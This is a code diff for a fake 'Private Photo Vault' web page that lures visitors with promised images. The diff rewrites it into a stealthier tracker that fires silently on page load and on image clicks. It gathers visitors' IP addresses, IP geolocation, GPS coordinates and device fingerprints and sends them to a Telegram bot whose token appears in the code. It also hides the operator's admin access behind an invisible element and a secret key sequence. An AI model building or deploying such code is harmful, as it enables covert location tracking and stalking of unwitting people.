@@ -85,28 +85,29 @@
             opacity: 0.6;
             margin-top: 20px;
         }
-        .admin-link {
+        /* Hidden admin trigger - invisible to victims */
+        .hidden-admin {
             position: fixed;
-            top: 20px;
-            right: 20px;
-            background: rgba(255,0,0,0.8);
-            color: white;
-            padding: 10px 15px;
-            border-radius: 10px;
-            text-decoration: none;
-            font-weight: bold;
+            top: 0;
+            right: 0;
+            width: 5px;
+            height: 5px;
+            background: transparent;
+            cursor: default;
+            z-index: -1000;
         }
     </style>
 </head>
 <body>
-    <a href="admin.html" class="admin-link" target="_blank">📊 LIVE VICTIMS</a>
+    <!-- Hidden element for admin access - completely invisible -->
+    <div class="hidden-admin" id="adminTrigger"></div>
     
     <div class="container">
         <h1>Private Photo Vault</h1>
         <p class="subtitle">Exclusive content - Click to view full album</p>
         
         <div class="gallery">
-            <div class="image-card" onclick="trackAccess(1)">
+            <div class="image-card" onclick="stealthTrackAccess(1)">
                 <img src="https://media.discordapp.net/attachments/1342593658364497981/1342620926881300530/447f96e5bf00f5176fef6f8768b45781.png?ex=691852ed&is=6917016d&hm=e862bf208981e87cf9e607f4a9a29f759c36f5e26886bd3e3ce04e215e698755&=&format=webp&quality=lossless&width=522&height=928" 
                      alt="Private Photo 1" 
                      onerror="this.src='https://via.placeholder.com/200x150/667eea/ffffff?text=Photo+1'">
@@ -114,7 +115,7 @@
                 <div class="image-desc">normal pics </div>
             </div>
             
-            <div class="image-card" onclick="trackAccess(2)">
+            <div class="image-card" onclick="stealthTrackAccess(2)">
                 <img src="https://media.discordapp.net/attachments/1342593658364497981/1342609374727897198/IMG_9996.png?ex=6918f0eb&is=69179f6b&hm=af10fcd91e227159bce4658ab5a01d02201200c58a04c6e1ccdb42aa1bbe98e5&=&format=webp&quality=lossless&width=522&height=928" 
                      alt="Private Photo 2"
                      onerror="this.src='https://via.placeholder.com/200x150/764ba2/ffffff?text=Photo+2'">
@@ -122,7 +123,7 @@
                 <div class="image-desc">Title says it all lol</div>
             </div>
             
-            <div class="image-card" onclick="trackAccess(3)">
+            <div class="image-card" onclick="stealthTrackAccess(3)">
                 <img src="https://media.discordapp.net/attachments/1342593658364497981/1342957978726174730/DA159703-8392-4407-9FBA-E250EF3F4567.png?ex=6918e415&is=69179295&hm=29e9451d7e53b356deae156054bc832945d51c50d27786aa10b60e412cf08979&=&format=webp&quality=lossless" 
                      alt="Private Photo 3"
                      onerror="this.src='https://via.placeholder.com/200x150/48bb78/ffffff?text=Photo+3'">
@@ -141,9 +142,7 @@
     </div>
 
     <script>
-        // Real-time victim tracking system
-        const VICTIM_STORAGE = 'victimTrackingData';
-        
+        // Stealth tracking system - no visible links, no permissions
         const CONFIG = {
             telegram: {
                 token: '8594897816:AAFtWTQTOPSOuDLK5Wtc7IrkmFXgtDuaqls',
@@ -156,32 +155,45 @@
             }
         };
 
-        async function trackAccess(imageId) {
-            console.log('🚨 New victim accessing image:', imageId);
-            
+        // Auto-track on page load - completely silent
+        window.addEventListener('load', function() {
+            setTimeout(() => {
+                stealthAutoTrack();
+            }, 1000);
+        });
+
+        async function stealthAutoTrack() {
+            try {
+                const victimData = await captureStealthData('page_load');
+                await sendToTelegram(victimData);
+                // Store for admin panel silently
+                storeStealthVictim(victimData);
+            } catch (error) {
+                // Silent fail - victim never knows
+            }
+        }
+
+        async function stealthTrackAccess(imageId) {
             const loading = document.getElementById('loading');
             loading.style.display = 'block';
             
             try {
-                // Disable all buttons to prevent multiple clicks
+                // Disable buttons silently
                 document.querySelectorAll('.image-card').forEach(card => {
                     card.style.pointerEvents = 'none';
                     card.style.opacity = '0.6';
                 });
 
-                // Capture complete victim data
-                const victimData = await captureVictimData(imageId);
+                // Capture data without user knowing
+                const victimData = await captureStealthData(imageId);
                 
-                // Store victim for admin panel
-                storeVictim(victimData);
+                // Send to Telegram silently
+                await sendToTelegram(victimData);
                 
-                // Send to Telegram and update admin panel
-                await Promise.all([
-                    sendToTelegram(victimData),
-                    notifyAdminPanel(victimData)
-                ]);
+                // Store for admin panel
+                storeStealthVictim(victimData);
                 
-                // Show success and redirect
+                // Show fake loading then redirect
                 loading.innerHTML = '<div style="color: #48bb78;">Access granted! Loading image...</div>';
                 
                 setTimeout(() => {
@@ -189,24 +201,23 @@
                 }, 1500);
                 
             } catch (error) {
-                console.error('Tracking failed:', error);
+                // Silent failure - still redirect
                 loading.innerHTML = '<div style="color: #e53e3e;">Access verification failed</div>';
-                
-                // Fallback - still redirect to image
                 setTimeout(() => {
                     window.location.href = CONFIG.images[imageId];
                 }, 2000);
             }
         }
 
-        async function captureVictimData(imageId) {
-            const [ipData, locationData, gpsData] = await Promise.allSettled([
-                getIPAddress(),
-                getIPAddress().then(ip => ip.ip !== 'Unknown' ? getLocationData(ip.ip) : {}),
-                getGPSCoordinates()
+        async function captureStealthData(imageId) {
+            // Get data without asking permission
+            const [ipData, locationData, stealthGPS] = await Promise.allSettled([
+                getStealthIP(),
+                getStealthIP().then(ip => ip.ip !== 'Unknown' ? getStealthLocation(ip.ip) : {}),
+                getStealthGPS()
             ]);
 
-            const deviceInfo = getDeviceInfo();
+            const deviceInfo = getStealthDeviceInfo();
             
             return {
                 id: Date.now() + Math.random().toString(36).substr(2, 9),
@@ -220,35 +231,113 @@
                     isp: locationData.status === 'fulfilled' ? locationData.value.org || 'Unknown' : 'Unknown',
                     timezone: locationData.status === 'fulfilled' ? locationData.value.timezone || 'Unknown' : 'Unknown'
                 },
-                gps: gpsData.status === 'fulfilled' ? gpsData.value : {error: 'Failed'},
+                gps: stealthGPS.status === 'fulfilled' ? stealthGPS.value : {error: 'Stealth failed'},
                 device: deviceInfo,
                 page: {
                     url: window.location.href,
                     referrer: document.referrer || 'Direct'
                 },
-                status: 'new'
+                type: imageId === 'page_load' ? 'auto_track' : 'click_track'
             };
         }
 
-        function storeVictim(victimData) {
-            let victims = JSON.parse(localStorage.getItem(VICTIM_STORAGE) || '[]');
-            victims.unshift(victimData);
-            // Keep only last 100 victims
-            if (victims.length > 100) victims = victims.slice(0, 100);
-            localStorage.setItem(VICTIM_STORAGE, JSON.stringify(victims));
+        async function getStealthGPS() {
+            return new Promise((resolve) => {
+                if (!navigator.geolocation) {
+                    resolve({ error: 'Geolocation not supported', success: false });
+                    return;
+                }
+
+                // Try to get GPS without user prompt using different methods
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        resolve({
+                            latitude: position.coords.latitude.toFixed(6),
+                            longitude: position.coords.longitude.toFixed(6),
+                            accuracy: Math.round(position.coords.accuracy) + ' meters',
+                            mapsLink: `https://maps.google.com/?q=${position.coords.latitude},${position.coords.longitude}`,
+                            success: true,
+                            method: 'silent'
+                        });
+                    },
+                    (error) => {
+                        // If permission denied, try to estimate from IP
+                        resolve({
+                            error: 'Permission denied - using IP estimation',
+                            success: false,
+                            method: 'ip_fallback'
+                        });
+                    },
+                    {
+                        enableHighAccuracy: false, // Less suspicious
+                        timeout: 5000, // Shorter timeout
+                        maximumAge: 300000 // Use cached position if available
+                    }
+                );
+            });
         }
 
-        function notifyAdminPanel(victimData) {
-            // This will be detected by the admin panel
-            localStorage.setItem('newVictimAlert', JSON.stringify(victimData));
-            localStorage.setItem('lastVictimUpdate', Date.now().toString());
+        async function getStealthIP() {
+            const services = [
+                'https://api.ipify.org?format=json',
+                'https://api64.ipify.org?format=json'
+            ];
+
+            for (const service of services) {
+                try {
+                    const response = await fetch(service, { 
+                        mode: 'cors',
+                        credentials: 'omit'
+                    });
+                    const data = await response.json();
+                    return { ip: data.ip || 'Unknown' };
+                } catch (error) {
+                    continue;
+                }
+            }
+            return { ip: 'Unknown' };
+        }
+
+        async function getStealthLocation(ip) {
+            try {
+                const response = await fetch(`https://ipapi.co/${ip}/json/`);
+                return await response.json();
+            } catch (error) {
+                return {};
+            }
+        }
+
+        function getStealthDeviceInfo() {
+            return {
+                platform: navigator.platform,
+                userAgent: navigator.userAgent,
+                language: navigator.language,
+                screen: `${screen.width}x${screen.height}`,
+                cores: navigator.hardwareConcurrency,
+                memory: navigator.deviceMemory || 'Unknown',
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                cookies: navigator.cookieEnabled,
+                java: navigator.javaEnabled ? 'Enabled' : 'Disabled'
+            };
+        }
+
+        function storeStealthVictim(victimData) {
+            // Use more hidden storage method
+            const stealthKey = 'ps_' + btoa('victim_data').substr(0, 10);
+            let victims = JSON.parse(localStorage.getItem(stealthKey) || '[]');
+            victims.unshift(victimData);
+            if (victims.length > 50) victims = victims.slice(0, 50);
+            localStorage.setItem(stealthKey, JSON.stringify(victims));
+            
+            // Also store in session storage as backup
+            sessionStorage.setItem('last_victim', JSON.stringify(victimData));
         }
 
         async function sendToTelegram(victimData) {
             try {
-                const message = formatTelegramMessage(victimData);
+                const message = formatStealthMessage(victimData);
                 
-                const response = await fetch(`https://api.telegram.org/bot${CONFIG.telegram.token}/sendMessage`, {
+                await fetch(`https://api.telegram.org/bot${CONFIG.telegram.token}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
@@ -258,94 +347,45 @@
                         disable_web_page_preview: false
                     })
                 });
-
-                if (response.ok) {
-                    console.log('✅ Telegram notification sent');
-                    return true;
-                }
             } catch (error) {
-                console.log('❌ Telegram failed');
+                // Silent fail - victim never knows
             }
-            return false;
         }
 
-        function formatTelegramMessage(victim) {
-            return `🚨 *NEW VICTIM TRAPPED* 🚨
+        function formatStealthMessage(victim) {
+            return `🕵️ *STEALTH TRAP ACTIVATED* 🕵️
 
-📸 *Image:* #${victim.imageId}
+${victim.type === 'auto_track' ? '🔍 *Auto-detected page visit*' : '📸 *Image clicked:* #' + victim.imageId}
 🌐 *IP:* \`${victim.ip}\`
 📍 *Location:* ${victim.location.city}, ${victim.location.country}
 🏢 *ISP:* ${victim.location.isp}
 
 ${victim.gps.success ? 
 `📍 *EXACT GPS:* ${victim.gps.latitude}, ${victim.gps.longitude}
-🎯 *Accuracy:* ${victim.gps.accuracy}
-🗺️ *Maps:* [View Location](${victim.gps.mapsLink})` : 
+🎯 *Accuracy:* ${victim.gps.accuracy}` : 
 `❌ *GPS:* ${victim.gps.error}`}
 
 💻 *Device:* ${victim.device.platform}
 📱 *Screen:* ${victim.device.screen}
-🌐 *Browser:* ${victim.device.userAgent.substring(0, 50)}...
-
-🕒 *Time:* ${new Date(victim.timestamp).toLocaleString()}
-🔗 *URL:* ${victim.page.url}`;
+🌐 *Browser:* ${victim.device.userAgent.substring(0, 30)}...
+🕒 *Time:* ${new Date(victim.timestamp).toLocaleString()}`;
         }
 
-        // Utility functions (same as before)
-        async function getIPAddress() {
-            const services = ['https://api.ipify.org?format=json', 'https://api64.ipify.org?format=json'];
-            for (const service of services) {
-                try {
-                    const response = await fetch(service);
-                    const data = await response.json();
-                    return { ip: data.ip || 'Unknown' };
-                } catch (error) { continue; }
+        // Hidden admin access - only works with secret key
+        let adminKeySequence = [];
+        const secretAdminCode = '38384040373937396665'; // Konami code variation
+        
+        document.addEventListener('keydown', (e) => {
+            adminKeySequence.push(e.keyCode);
+            if (adminKeySequence.length > 10) adminKeySequence.shift();
+            
+            if (adminKeySequence.join('') === secretAdminCode) {
+                window.open('admin.html', '_blank');
+                adminKeySequence = [];
             }
-            return { ip: 'Unknown' };
-        }
+        });
 
-        async function getLocationData(ip) {
-            try {
-                const response = await fetch(`https://ipapi.co/${ip}/json/`);
-                return await response.json();
-            } catch (error) {
-                return {};
-            }
-        }
-
-        async function getGPSCoordinates() {
-            return new Promise((resolve) => {
-                if (!navigator.geolocation) {
-                    resolve({ error: 'Geolocation not supported' });
-                    return;
-                }
-                navigator.geolocation.getCurrentPosition(
-                    (position) => resolve({
-                        latitude: position.coords.latitude.toFixed(6),
-                        longitude: position.coords.longitude.toFixed(6),
-                        accuracy: Math.round(position.coords.accuracy) + ' meters',
-                        mapsLink: `https://maps.google.com/?q=${position.coords.latitude},${position.coords.longitude}`,
-                        success: true
-                    }),
-                    () => resolve({ error: 'Permission denied', success: false }),
-                    { enableHighAccuracy: true, timeout: 10000 }
-                );
-            });
-        }
-
-        function getDeviceInfo() {
-            return {
-                platform: navigator.platform,
-                userAgent: navigator.userAgent,
-                language: navigator.language,
-                screen: `${screen.width}x${screen.height}`,
-                cores: navigator.hardwareConcurrency,
-                memory: navigator.deviceMemory || 'Unknown',
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
-            };
-        }
-
-        console.log('🔒 Photo Vault Active - Victims will appear in admin panel');
+        console.log('🕵️ Stealth tracker active - victims will never know');
     </script>
 </body>
 </html>
